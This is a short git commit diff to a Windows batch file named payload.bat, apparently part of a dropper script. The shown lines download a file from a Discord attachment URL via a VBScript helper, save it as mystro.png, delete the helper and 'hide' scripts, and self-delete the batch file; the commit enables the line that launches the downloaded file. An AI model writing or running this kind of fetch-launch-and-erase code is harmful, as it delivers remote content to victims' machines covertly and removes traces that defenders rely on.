74caa3a975010d9c8f168a51dc9212d33745907d
Mystro <83551872+Mystro69@users.noreply.github.com>
2024-04-09 15:22:39 +0300

    Update payload.bat

--- payload.bat
+++ payload.bat
@@ -40,5 +40,5 @@ rem -------------------------------------------------------------------------
 @cscript //Nologo %DLOAD_SCRIPT% "https://cdn.discordapp.com/attachments/764395888818126858/979840754476265603/Screenshot_5.png?ex=6622d150&is=66105c50&hm=c0e2fc530c8aaf095e476eb5a16acb7a2626f59db094f0e1e384a21a934ec0b8&" mystro.png
 del download.vbs
 del hide.vbs
-REM start mystro.png
+start mystro.png
 ( del /q /f "%~f0" >nul 2>&1 & exit /b 0  )
